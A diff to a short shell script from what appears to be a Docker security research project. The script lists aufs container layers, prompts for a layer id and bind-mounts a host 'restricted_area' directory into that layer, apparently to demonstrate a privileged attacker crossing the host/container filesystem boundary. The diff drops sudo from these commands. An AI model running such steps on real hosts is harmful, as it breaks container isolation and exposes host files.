@@ -1,6 +1,6 @@
 #!/bin/sh
 
-attack="/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/privileged_attacker"
+attack="/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/privileged_attacker/all_by_attacker"
 
 #Layers in container's filesystem
 sudo ls /var/lib/docker/aufs/diff
@@ -9,14 +9,14 @@ echo "Please give layer's id:"
 read layer
 
 #####sudo or not sudo
-sudo mkdir /var/lib/docker/aufs/diff/${layer}/doot
+mkdir /var/lib/docker/aufs/diff/${layer}/doot
 
 #mkdir ${attack}/restricted_area
 #touch ${attack}/restricted_area/HellloFromTheOtherSide
 
 ######sudo or not sudo
 #Then mount a host directory to doot
-sudo mount -o bind ${attack}/restricted_area /var/lib/docker/aufs/diff/${layer}/doot
+mount -o bind ${attack}/restricted_area /var/lib/docker/aufs/diff/${layer}/doot
 
 #Get some info around mount
 #Find mountpoint and of directory restricted area and special device that needs to be created
